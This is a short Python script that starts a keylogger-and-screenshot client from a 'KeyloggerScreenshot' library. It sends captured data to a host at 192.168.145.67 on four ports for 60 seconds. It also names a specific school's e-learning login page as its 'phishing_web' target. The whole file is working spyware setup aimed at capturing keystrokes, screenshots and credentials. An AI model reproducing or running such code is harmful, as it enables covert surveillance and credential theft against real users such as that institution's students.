import KeyloggerScreenshot as ks

ip = "192.168.145.67"
key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333, ip, 4444, duration_in_seconds=60, phishing_web="https://elearning.borg1.at/login/index.php")
key_client.start()
